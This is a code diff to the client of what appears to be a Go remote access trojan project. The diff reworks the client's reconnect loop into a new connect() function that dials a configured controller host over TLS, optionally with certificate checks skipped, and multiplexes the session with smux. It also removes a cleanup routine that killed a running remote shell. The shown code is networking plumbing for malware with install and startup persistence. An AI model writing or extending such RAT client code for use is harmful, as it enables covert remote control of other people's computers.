@@ -9,8 +9,9 @@ import (
 	"rat/client/startup"
 	"rat/shared"
 	"rat/shared/installpath"
-	"rat/shared/network"
 	"time"
+
+	"github.com/xtaci/smux"
 )
 
 var conn *tls.Conn
@@ -43,65 +44,38 @@ func main() {
 		fmt.Println("Install failed:", err.Error())
 	}
 
-	start(Config)
-}
-
-func start(config shared.BinaryConfig) {
 	for {
-		host := config.Host
-		fmt.Println("Connecting to", host)
-
-		var err error
-		conn, err = tls.Dial("tcp", host, &tls.Config{
-			InsecureSkipVerify: Config.InvalidSSL,
-		})
-
-		con := Connection{
-			Conn:   conn,
-			Writer: network.Writer{conn},
-			Reader: network.Reader{conn},
-		}
-
-		if err != nil {
-			fmt.Println(err.Error())
-			goto end
-		}
-
-		Queue = make(chan OutgoingPacket)
-		Transfers = make(TransfersMap)
-
-		go func() {
-			for {
-				packet := <-Queue
-
-				packet.Init()
-				con.WritePacket(packet)
-			}
-		}()
-
-		con.Init()
-
-		for {
-			_, err := con.ReadPacket()
-			if err != nil {
-				fmt.Println(err.Error())
-				con.Close()
-				break
-			}
-		}
-
-	end:
-		Close()
-		time.Sleep(time.Second * time.Duration(config.Delay))
+		fmt.Println("disconnect", connect(Config))
+		time.Sleep(time.Second * time.Duration(Config.Delay))
 	}
 }
 
-// Close is called when connection is lost
-func Close() {
-	// Kill any running shell
-	if current.process != nil {
-		current.process.Process.Kill()
+func connect(config shared.BinaryConfig) error {
+	host := config.Host
+	fmt.Println("Connecting to", host)
+
+	var err error
+	conn, err = tls.Dial("tcp", host, &tls.Config{
+		InsecureSkipVerify: Config.InvalidSSL,
+	})
+	if err != nil {
+		return err
 	}
+
+	session, _ := smux.Client(conn, nil)
+
+	con, err := NewConnection(session)
+	if err != nil {
+		return err
+	}
+
+	go con.writeLoop()
+	go con.recvLoop()
+
+	con.Init()
+	<-con.die
+
+	return err
 }
 
 func Uninstall() {
